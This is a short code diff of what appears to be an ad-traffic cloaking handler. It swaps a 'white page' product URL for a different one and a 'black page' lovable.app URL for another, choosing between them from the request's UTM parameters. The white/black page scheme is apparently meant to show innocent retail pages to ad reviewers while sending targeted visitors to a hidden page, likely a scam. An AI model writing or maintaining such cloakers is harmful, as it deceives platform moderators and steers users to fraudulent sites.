@@ -1,7 +1,7 @@
 export default function handler(req, res) {
     // URLs to redirect
-    const whitePageURL = "https://www.decjuba.com.au/products/girls-retro-crop-ringer-tee-lilrasp?utm_campaign=HOMEPAGE+GALLERY+-+KIDS+&utm_medium=Instagram&utm_source=Social&utm_content=www.instagram.com/p/DQso3gpDuOy/&variant=40600696520776";
-    const blackPageURL = "https://nowhereher.lovable.app/?";
+    const whitePageURL = "https://woodaction.com/collections/decor-1/products/6-pigeon-wall-decor";
+    const blackPageURL = "https://ubuzznotifier.lovable.app/";
   
     // Parse the UTM parameters from the request URL
     const queryParams = new URLSearchParams(req.url.split('?')[1]);
@@ -26,6 +26,7 @@ export default function handler(req, res) {
     res.end();
 
   }
+
 
 
 
